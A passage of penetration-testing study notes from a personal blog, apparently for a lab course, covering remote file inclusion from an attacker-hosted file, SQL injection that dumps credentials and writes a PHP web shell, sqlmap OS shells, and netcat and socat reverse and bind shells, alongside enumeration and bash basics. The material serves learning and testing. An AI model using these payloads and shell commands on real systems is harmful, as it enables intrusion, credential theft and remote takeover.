<p><code>http://192.168.148.10/menu.php?file=http://192.168.119.148/evil.txt&amp;cmd=ipconfig</code><br>host the file by setup a apache server  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo vi &#x2F;var&#x2F;www&#x2F;html&#x2F;evil.txt</span><br><span class="line">sudo systemctl start apache2</span><br><span class="line"></span><br><span class="line">or </span><br><span class="line"></span><br><span class="line">sudo python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p><code>/usr/share/webshells</code>  </p>
<h2 id="Expanding-Your-Repertoire"><a href="#Expanding-Your-Repertoire" class="headerlink" title="Expanding Your Repertoire"></a>Expanding Your Repertoire</h2><p>open a http server on current workign path</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 2334</span><br><span class="line">python3 -m http.server 7331</span><br><span class="line">php -S 0.0.0.0:8000</span><br><span class="line">ruby -run -e httpd . -p 9000</span><br><span class="line">busybox httpd -f -p 10000</span><br></pre></td></tr></table></figure>

<h2 id="PHP-Wrappers"><a href="#PHP-Wrappers" class="headerlink" title="PHP Wrappers"></a>PHP Wrappers</h2><p>when cannot poison local files<br><code>menu.php?file=data:text/plain,hello world</code><br>treat the data wrapper as a file<br><code>menu.php?file=data:text/plain,&lt;?php echo shell_exec(&quot;dir&quot;) ?&gt;</code>  </p>
<h1 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h1><h2 id="Discover-SQL-Injection-Vulnerabilities"><a href="#Discover-SQL-Injection-Vulnerabilities" class="headerlink" title="Discover SQL Injection Vulnerabilities"></a>Discover SQL Injection Vulnerabilities</h2><p>Common statement in sql;<br><code>$query = &quot;select * from users where username = &#39;$user&#39; and password = &#39;$pass&#39;&quot;;</code>  </p>
<h2 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h2><p><code>tom&#39; or 1=1;#</code>  <code>#</code> is comment in mysql and mariadb<br>Some web application expect the number of returned rows is 1  add LIMIT 1 <code>tom&#39; or 1=1 LIMIT 1;#</code>  </p>
<h2 id="Enumerating-the-database"><a href="#Enumerating-the-database" class="headerlink" title="Enumerating the database"></a>Enumerating the database</h2><p><code>http://192.168.148.10/debug.php?id=&#39;</code>  </p>
<h3 id="Column-number-enueration"><a href="#Column-number-enueration" class="headerlink" title="Column number enueration"></a>Column number enueration</h3><p><code>http://192.168.148.10/debug.php?id=1 order by 1</code><br>Use burpsuit repeater tool<br>results cotain 3 colums</p>
<h2 id="extra-further-data-with-union-statement"><a href="#extra-further-data-with-union-statement" class="headerlink" title="extra further data with union statement"></a>extra further data with union statement</h2><p>decide which colum is displayed<br><code>192.168.148.10/debug.php?id=1 union all select 1,2,3</code>  </p>
<p><strong>Union all allow duplicate values</strong>  </p>
<p>colum 2,3 get displayed<br>extract database verison: (depend on database engine, MariaDB use @@version)<br><code>http://192.168.148.10/debug.php?id=1 union all select 1, 2, @@version</code>  -&gt;  10.1.31-MariaDB<br>extract current database user<br><code>http://192.168.148.10/debug.php?id=1 union all select 1, 2, user() </code>  -&gt; root@localhost  </p>
<p>We can enumerate database tables and column structures through the information_schema.<br>The information schema stores information about the database, like table and column names.<br>We can use it to get the layout of the database so that we can craft better payloads to extract<br>sensitive data. The query for this would look similar to the following:<br><code>http://192.168.148.10/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables</code>  </p>
<p>retrieve column name of user table:<br><code>http://192.168.148.10/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name=&#39;users&#39;</code></p>
<p>extra user name and password:<br><code>http://192.168.148.10/debug.php?id=1 union all select 1, username, password from users</code></p>
<h2 id="From-sql-injection-to-code-execution"><a href="#From-sql-injection-to-code-execution" class="headerlink" title="From sql injection to code execution"></a>From sql injection to code execution</h2><p><code>http://192.168.148.10/debug.php?id=1 union all select 1, 2, load_file(&#39;C:/Windows/System32/drivers/etc/hosts&#39;)</code></p>
<p>into outfile:<br>from the error message, we know the location of webserver root: c:\xampp\htdocs  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.148.10&#x2F;debug.php?id&#x3D;1 union all select 1, 2, &quot;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot; into OUTFILE &#39;c:&#x2F;xampp&#x2F;htdocs&#x2F;backdoor2.php&#39;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.148.10&#x2F;debug.php?id&#x3D;1 union all select 1, 2, &quot;&lt;?php &#39;&lt;pre&gt;&#39; . shell_exec($_GET[&#39;cmd&#39;]) . &#39;&lt;&#x2F;pre&gt;&#39;;?&gt;&quot; into OUTFILE &#39;c:&#x2F;xampp&#x2F;htdocs&#x2F;backdoor4.php&#39;</span><br></pre></td></tr></table></figure>

<h2 id="Automating-sql-injection"><a href="#Automating-sql-injection" class="headerlink" title="Automating sql injection"></a>Automating sql injection</h2><p>sqlmap – not allowed in the exam<br><code>sqlmap -u http://192.168.148.10/debug.php?id=1 -p &quot;id&quot;</code><br>-p parameter to test  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1 AND 6836&#x3D;6836</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: id&#x3D;1 AND (SELECT 4323 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(4323&#x3D;4323,1))),0x716b627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1 AND (SELECT 1257 FROM (SELECT(SLEEP(5)))yDOk)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: id&#x3D;1 UNION ALL SELECT NULL,CONCAT(0x7171767071,0x5a65795043747065446255675763434c564c48537750534f6d437859715570677765524e4552616a,0x716b627a71),NULL-- -</span><br></pre></td></tr></table></figure>

<p>automate the data extraction<br><code>sqlmap -u http://192.168.148.10/debug.php?id=1 -p &quot;id&quot; --dbms=mysql --dump</code></p>
<p>mysql and mariadb looks similar  </p>
<p>get os shell automatically:<br><code>sqlmap -u http://192.168.148.10/debug.php?id=1 -p &quot;id&quot; --dbms=mysql --os-shell</code></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/15/Study-Notes-2021-03-15/">Study Notes - 2021/03/15</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-15</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="NFS-Enumeration"><a href="#NFS-Enumeration" class="headerlink" title="NFS Enumeration"></a>NFS Enumeration</h1><p>port 111<br><code>nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254</code>  </p>
<h2 id="nmap-nfs-nse-script"><a href="#nmap-nfs-nse-script" class="headerlink" title="nmap nfs nse script"></a>nmap nfs nse script</h2><p><code>nmap -p 111 --script nfs* 10.11.1.72</code>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT    STATE SERVICE</span><br><span class="line">111&#x2F;tcp open  rpcbind</span><br><span class="line">| nfs-showmount: </span><br><span class="line">|_  &#x2F;home 10.11.0.0&#x2F;255.255.0.0</span><br></pre></td></tr></table></figure>
<p>mount it to our machine:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir home_72</span><br><span class="line">sudo mount -o nolock 10.11.1.72:&#x2F;home home_72</span><br></pre></td></tr></table></figure>
<p>-o nolock disable filelocking, need for old NFS servers</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drwxr-xr-x 2 nobody 4294967294 4096 Oct 27  2019 .</span><br><span class="line">drwxr-xr-x 7 root   root       4096 Sep 17  2015 ..</span><br><span class="line">-rwx------ 1 nobody 4294967294   48 Oct 27  2019 creds.txt</span><br></pre></td></tr></table></figure>
<p>shows nobody instead of userid, can not create a user id as guide shown  </p>
<h1 id="SMTP-enumeration"><a href="#SMTP-enumeration" class="headerlink" title="SMTP enumeration"></a>SMTP enumeration</h1><p>find existing users<br>port 25, udp   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 10.11.1.217 25</span><br><span class="line">VRFY idontexist</span><br></pre></td></tr></table></figure>
<h1 id="SNMP-Enumeration"><a href="#SNMP-Enumeration" class="headerlink" title="SNMP Enumeration"></a>SNMP Enumeration</h1><h2 id="SNMP-MIB-Tree"><a href="#SNMP-MIB-Tree" class="headerlink" title="SNMP MIB Tree"></a>SNMP MIB Tree</h2><h2 id="Scan-for-SNMP"><a href="#Scan-for-SNMP" class="headerlink" title="Scan for SNMP"></a>Scan for SNMP</h2><p><code>sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt</code><br>–open only display open ports<br><code>onesixtyone -c community -i ips</code><br><code>onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.119.133 </code>   </p>
<h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p>enumerating the entire MIB tree:<br><code>snmpwalk -c public -v1 -t 10 10.11.1.14</code><br>-v snmp version number<br>-t increase timeout to 10s  </p>
<h2 id="enumerating-windows-users"><a href="#enumerating-windows-users" class="headerlink" title="enumerating windows users"></a>enumerating windows users</h2><h2 id="enumerating-windows-processses"><a href="#enumerating-windows-processses" class="headerlink" title="enumerating windows processses"></a>enumerating windows processses</h2><h2 id="open-tcp-ports"><a href="#open-tcp-ports" class="headerlink" title="open tcp ports"></a>open tcp ports</h2><h2 id="software"><a href="#software" class="headerlink" title="software"></a>software</h2><h1 id="Vulnerability-Scanning"><a href="#Vulnerability-Scanning" class="headerlink" title="Vulnerability Scanning"></a>Vulnerability Scanning</h1><p>scanner with nessus<br>open in browser: <code>https://localhost:8834/</code>  </p>
<h2 id="Vul-scan-with-nmap"><a href="#Vul-scan-with-nmap" class="headerlink" title="Vul scan with nmap"></a>Vul scan with nmap</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;</span><br><span class="line">head script.db</span><br><span class="line"># can grep this file</span><br><span class="line">sudo nmap --scriot vuln 10.11.1.10</span><br></pre></td></tr></table></figure>


<h1 id="Attack-web-application"><a href="#Attack-web-application" class="headerlink" title="Attack web application"></a>Attack web application</h1><p><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project">https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project</a>  </p>
<ol>
<li>Injection</li>
<li>Broken Authentication</li>
<li>Sensitive Data Exposure</li>
<li>XML External Entities (XXE)</li>
<li>Broken Access Control </li>
<li>Security Misconfiguration</li>
<li>Cross-Site Scripting (XSS)</li>
<li>Insecure Deserialization</li>
<li>Using Components with Known Vulnerabilities</li>
<li>Insufficient Logging &amp; Monitoring</li>
</ol>
<h2 id="Web-application-Enueration"><a href="#Web-application-Enueration" class="headerlink" title="Web application Enueration"></a>Web application Enueration</h2><ul>
<li>Programming language and frameworks</li>
<li>Web server software</li>
<li>Database software</li>
<li>server OS </li>
</ul>
<h3 id="Inspecting-URLs"><a href="#Inspecting-URLs" class="headerlink" title="Inspecting URLs"></a>Inspecting URLs</h3><p>php<br>For example, a Java-based web application might use .jsp, .do, or .html.<br>concept of routes, map uri to a section of code</p>
<h3 id="Inspecting-Page-Content"><a href="#Inspecting-Page-Content" class="headerlink" title="Inspecting Page Content"></a>Inspecting Page Content</h3><p>Open Debugger, can pretty code content  </p>
<p>Right click -&gt; insepct Element  </p>
<p>View Response headers:  </p>
<ul>
<li>proxy </li>
<li>firefox network tool </li>
</ul>
<p>Server header somtimes reveal the server app and version number<br>Header start with <code>X-</code> are non-standard HTTP headers, can reveal additional info  </p>
<h3 id="Inspecting-sitemaps"><a href="#Inspecting-sitemaps" class="headerlink" title="Inspecting sitemaps"></a>Inspecting sitemaps</h3><p>most common site maps files:<br><code>robots.txt</code><br><code>sitemap.xml</code>  </p>
<h3 id="Locating-administration-consoles"><a href="#Locating-administration-consoles" class="headerlink" title="Locating administration consoles"></a>Locating administration consoles</h3><p>Two common examples are the manager application for Tomcat and phpMyAdmin for MySQL hosted at /manager/html and /phpmyadmin respectively.  </p>
<h2 id="Web-application-assessment-tools"><a href="#Web-application-assessment-tools" class="headerlink" title="Web application assessment tools"></a>Web application assessment tools</h2><h3 id="DIRB"><a href="#DIRB" class="headerlink" title="DIRB"></a>DIRB</h3><p>web content scanner, use wordlist.<br><code>dirb http://www.megacorpone.com -r -z 10</code><br>-r to scan non-recursively, and -z 10 to add a 10 millisecond delay to each request  </p>
<h3 id="Burp-suite"><a href="#Burp-suite" class="headerlink" title="Burp suite"></a>Burp suite</h3><p>foxyproxy firefox addon<br>add ca certificate for burpsuite<br>proxy-&gt;option-&gt;regenerate ca certificate<br>goto browser, enable proxy, open <a target="_blank" rel="noopener" href="http://burp/">http://burp</a>  -&gt; CA certificate to download crt file, import certificate<br>send to repeater, send single request  </p>
<h3 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h3><p>webserver scanner  - not intend to stealth itself, send info in user-agent to identify itself<br>-maxtime<br>-T which types of tests  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host&#x3D;megacorpne.com -maxtime&#x3D;30s</span><br></pre></td></tr></table></figure>

<h2 id="Exploiting"><a href="#Exploiting" class="headerlink" title="Exploiting"></a>Exploiting</h2><h3 id="exploting-admin-consoles"><a href="#exploting-admin-consoles" class="headerlink" title="exploting admin consoles"></a>exploting admin consoles</h3><p>Windows client -&gt; XAMPP, start apache and mysql  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;10.11.0.22 -r</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;10.11.0.22&#x2F;phpmyadmin&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="Burp-intruder"><a href="#Burp-intruder" class="headerlink" title="Burp intruder"></a>Burp intruder</h3><p><code>&lt;input type=&quot;hidden&quot; name=&quot;set_session&quot; value=&quot;7r8oiuuoofdtcgc7ao731o0tcc&quot; /&gt;</code><br><code>&lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;K&amp;amp;$&amp;amp;FR1\.cQ4)QW(&quot; /&gt;</code>  </p>
<p>send to intruder<br>select positions, type: Pitchfork, allowing us to set a unique payload list for each position.</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/14/Study-Notes-2021-03-14/">Study Notes - 2021/03/14</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-14</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Practical-Tools"><a href="#Practical-Tools" class="headerlink" title="Practical Tools"></a>Practical Tools</h1><h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><p><code>nc -nvlp 4444 -e /usr/bin/bash</code><br><code>nc -nv 192.168.xxx.xx 4444 -e /usr/bin/bash</code>  </p>
<p>Transfer file:<br><code>nc -nvlp 4444 &gt; incoming.txt</code><br><code>nc -nv xxx.xxx.xxx.xxx 4444 &lt; sendfile.txt</code></p>
<h2 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h2><p><code>socat - TCP4:10.11.0.22:110</code><br><code>sudo socat TCP4-LISTEN:443 STDOUT</code><br><code>sudo socat TCP4-LISTEN:443,fork file:secret.txt</code><br><code>socat TCP4:localhost:443 file:receive.txt,create </code>  </p>
<h3 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h3><p><code>sudo socat -d -d TCP4-LISTEN:443 STDOUT</code><br><code>socat TCP4:localhost:443 EXEC:/bin/bash</code><br>-d -d increase verbose level two times  </p>
<h3 id="encrypted-bind-shells"><a href="#encrypted-bind-shells" class="headerlink" title="encrypted bind shells"></a>encrypted bind shells</h3><p>create certificate:<br><code>openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt</code><br><code>cat bind_shell.key bind_shell.crt &gt; bind_shell.pem</code><br><code>sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash</code><br><code>socat - OPENSSL:localhost:443,verify=0</code>  </p>
<h1 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h1><p><code>Set-ExecutionPolicy Unrestricted</code></p>
<h2 id="file-transfer"><a href="#file-transfer" class="headerlink" title="file transfer"></a>file transfer</h2><p>…<br>Let me skip this  </p>
<h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><p>catpure filter:<br><code>net 10.11.1.0/24</code><br>display filter:<br><code>tcp.port == 21</code><br>rightclick package-&gt;follow tcp stream  </p>
<h1 id="TCPDUMP"><a href="#TCPDUMP" class="headerlink" title="TCPDUMP"></a>TCPDUMP</h1><p><code>sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F&quot; &quot; &#39;&#123;print $5&#125;&#39; | sort | uniq -c | head</code>  </p>
<h1 id="Bash-Scripting"><a href="#Bash-Scripting" class="headerlink" title="Bash Scripting"></a>Bash Scripting</h1><h2 id="variable"><a href="#variable" class="headerlink" title="variable"></a>variable</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1&#x3D;hello</span><br><span class="line">echo $varq</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1&#x3D;&#39;hell world&#39;</span><br><span class="line">var1&#x3D;&quot;hello world&quot;</span><br></pre></td></tr></table></figure>
<p>for single quote: interprets every enclosed character literally<br>for double quote: excpet <code>$</code>, ```, and <code>\</code>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user&#x3D;$(whoami)</span><br><span class="line">user2&#x3D;&#96;whoami&#96;</span><br></pre></td></tr></table></figure>
<p><strong>command execute in a subshell</strong><br>$1, $2 …. arguments<br>$? The exit status of the most recently run process   </p>
<h2 id="Reading-user-input"><a href="#Reading-user-input" class="headerlink" title="Reading user input"></a>Reading user input</h2><p><code>read answer</code>  assign to answer variable<br>-p specify the prompt<br>-sp secret prompt  </p>
<h2 id="Conditions"><a href="#Conditions" class="headerlink" title="Conditions"></a>Conditions</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if [ &lt;sometest&gt; ]</span><br><span class="line">then </span><br><span class="line">    &lt;statements&gt;</span><br><span class="line">elif [ &lt;condition&gt; ]</span><br><span class="line">then </span><br><span class="line">    &lt;statement&gt;</span><br><span class="line">else</span><br><span class="line">    &lt;statments&gt;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Operator Description: Expression True if…</span><br><span class="line">!EXPRESSION The EXPRESSION is false.</span><br><span class="line">-n STRING STRING length is greater than zero</span><br><span class="line">-z STRING The length of STRING is zero (empty)</span><br><span class="line">STRING1 !&#x3D; STRING2 STRING1 is not equal to STRING2</span><br><span class="line">STRING1 &#x3D; STRING2 STRING1 is equal to STRING2</span><br><span class="line">INTEGER1 -eq INTEGER2 INTEGER1 is equal to INTEGER2</span><br><span class="line">INTEGER1 -ne INTEGER2 INTEGER1 is not equal to INTEGER2</span><br><span class="line">INTEGER1 -gt INTEGER2 INTEGER1 is greater than INTEGER2</span><br><span class="line">INTEGER1 -lt INTEGER2 INTEGER1 is less than INTEGER2</span><br><span class="line">INTEGER1 -ge INTEGER2 INTEGER1 is greater than or equal to INTEGER 2</span><br><span class="line">INTEGER1 -le INTEGER2 INTEGER1 is less than or equal to INTEGER 2</span><br><span class="line">-d FILE FILE exists and is a directory</span><br><span class="line">-e FILE FILE exists</span><br><span class="line">-r FILE FILE exists and has read permission</span><br><span class="line">-s FILE FILE exists and it is not empty</span><br><span class="line">-w FILE FILE exists and has write permission</span><br><span class="line">-x FILE FILE exists and has execute permission</span><br></pre></td></tr></table></figure>

<p><code>cmd &amp;&amp; cmd2</code> execute cmd2 only if cmd return true/success<br><code>cmd || cmd2</code> execute if cmd fails  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if [ &lt;cond1&gt; ] &amp;&amp; [ &lt;cond2&gt; ]</span><br><span class="line">then</span><br><span class="line">    &lt;statement&gt;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<h2 id="Loops"><a href="#Loops" class="headerlink" title="Loops:"></a>Loops:</h2><h3 id="For-loop"><a href="#For-loop" class="headerlink" title="For loop"></a>For loop</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for var-name in &lt;list&gt;</span><br><span class="line">do</span><br><span class="line">    &lt;action&gt;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">for ip in $(seq 1 10); do echo 10.11.1.$ip; done</span><br><span class="line">for i in &#123;1..10&#125;; do echo 10.11.1.$i;done</span><br></pre></td></tr></table></figure>

<h3 id="While-loops"><a href="#While-loops" class="headerlink" title="While loops"></a>While loops</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">while [ &lt;some test&gt; ]</span><br><span class="line">do</span><br><span class="line">    &lt;perform an action&gt;</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h2 id="functions"><a href="#functions" class="headerlink" title="functions"></a>functions</h2><p>``<br>function function_name {<br>echo “$1”<br>}</p>
<p>function_name () {<br>commands…<br>}</p>
<p>function_name $RANDOM</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**function must defined before get called**  </span><br><span class="line">### Return</span><br><span class="line">&#96;&#96;&#96; bash</span><br><span class="line">function1() &#123;</span><br><span class="line"> return $RANDOM   </span><br><span class="line">&#125;</span><br><span class="line">function1</span><br><span class="line">echo &quot;value returned is $?&quot;</span><br></pre></td></tr></table></figure>
<h3 id="local-variable"><a href="#local-variable" class="headerlink" title="local variable"></a>local variable</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name1=hello</span><br><span class="line">name2=name2</span><br><span class="line"><span class="function"><span class="title">func1</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> name1=world</span><br><span class="line">    name2=changed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="Some-practical-usage"><a href="#Some-practical-usage" class="headerlink" title="Some practical usage"></a>Some practical usage</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;href&#x3D;&quot; index.html | grep &quot;\.google&quot; | grep -v &quot;www\.google\.com&quot; | awk -F &quot;http:&#x2F;&#x2F;&quot; &#39;&#123;print $2&#125;&#39; | cut -d &quot;&#x2F;&quot; -f 1</span><br><span class="line">grep -o &#39;[^&#x2F;]*\.google\.com&#39; index.html | sort -u &gt; list.txt</span><br><span class="line">for url in $(cat list.txt); do host $url; done | grep &quot;has address&quot; | cut -d &quot; &quot; -f 4 | sort -u</span><br></pre></td></tr></table></figure>
<p>[^/]* any char except ‘/‘</p>
<h2 id="Second-usage"><a href="#Second-usage" class="headerlink" title="Second usage:"></a>Second usage:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit afd windows -w -t</span><br><span class="line">searchsploit afd windows -w -t | grep http | cut -f 2 -d &quot;|&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>-w Show URLs to Exploit-DB.com rather than the local path  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d &quot;|&quot;);</span><br><span class="line">do exp_name&#x3D;$(echo $e | cut -d &quot;&#x2F;&quot; -f 5) &amp;&amp; url&#x3D;$(echo $e | sed &#39;s&#x2F;exploits&#x2F;raw&#x2F;&#39;) &amp;&amp;</span><br><span class="line">wget -q --no-check-certificate $url -O $exp_name; done</span><br></pre></td></tr></table></figure>
<p>-q quite mode  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"># Bash script to search for a given exploit and download all matches.</span><br><span class="line">for e in $(searchsploit afd windows -w -t | grep http | cut -f 2 -d &quot;|&quot;)</span><br><span class="line">do</span><br><span class="line">exp_name&#x3D;$(echo $e | cut -d &quot;&#x2F;&quot; -f 5)</span><br><span class="line">url&#x3D;$(echo $e | sed &#39;s&#x2F;exploits&#x2F;raw&#x2F;&#39;)</span><br><span class="line">wget -q --no-check-certificate $url -O $exp_name</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

